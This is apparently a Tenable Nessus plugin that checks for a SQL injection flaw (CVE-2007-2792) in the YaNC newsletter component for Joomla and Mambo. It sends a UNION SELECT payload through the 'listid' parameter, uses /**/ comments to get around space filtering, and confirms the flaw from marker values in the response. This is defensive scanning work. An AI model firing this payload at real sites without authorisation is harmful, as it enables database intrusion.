#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25243);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2007-2792");
  script_bugtraq_id(24030);
  script_xref(name:"milw0rm", value:"3944");
  script_xref(name:"OSVDB", value:"37948");

  script_name(english:"YaNC yanc.html.php listid Parameter SQL Injection");
  script_summary(english:"Tries to use a SQL injection to manipulate a newsletter overview");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running YaNC, a third-party component for Joomla
and Mambo for managing newsletters. 

The version of YaNC installed on the remote host fails to properly
sanitize user input to the 'listid' parameter before using to build a
database query in the 'showPageHeader()' function in
'components/com_yanc/yanc.html.php'.  Regardless of PHP's
'magic_quotes_gpc' setting, an unauthenticated remote attacker can
leverage this issue to launch SQL injection attacks against the
affected application, leading to discovery of sensitive information,
attacks against the underlying database, and the like." );
 script_set_attribute(attribute:"see_also", value:"http://forum.joomla-addons.org/index.php?topic=1216.0" );
 script_set_attribute(attribute:"solution", value:
"If using Joomla, upgrade to Joomla 1.0.10 or later along with YaNC 1.4
RC1 or later.  Otherwise, edit the source as described in the author's
advisory referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
foreach dir (dirs)
{
  # Try to exploit the flaw to manipulate a newsletter overview.
  magic1 = unixtime();
  magic2 = rand();
  exploit = string("9999999 UNION SELECT ", magic1, ",", magic2, "--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  r = http_send_recv3(method: "GET", port: port, 
    item:string(
      dir, "/index.php?",
      "option=com_yanc&",
      "Itemid=9999999&",
      "listid=", exploit
    ));
  if (isnull(r)) exit(0);

  # There's a problem if we managed to set the title based on our magic.
  if (
    string('<td class="contentheading">', magic1, "</") >< r[2] &&
    string(': ', magic2, "</") >< r[2]
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
